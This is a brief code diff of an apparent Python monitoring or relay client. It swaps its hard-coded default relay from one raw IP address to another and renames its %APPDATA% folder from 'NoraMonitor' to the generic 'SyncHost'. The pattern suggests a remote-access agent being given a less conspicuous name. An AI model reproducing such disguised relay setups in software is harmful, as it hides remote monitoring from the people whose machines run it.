@@ -11,9 +11,9 @@ import socket
 import threading
 import socketio
 
-RELAY_URL = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
+RELAY_URL = os.environ.get("NORA_RELAY", "http://162.35.37.67:5000")
 
-_APP_DIR  = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
+_APP_DIR  = os.path.join(os.path.expandvars("%APPDATA%"), "SyncHost")
 _LOG_FILE = os.path.join(_APP_DIR, "nora.log")
 
 def _log(msg):
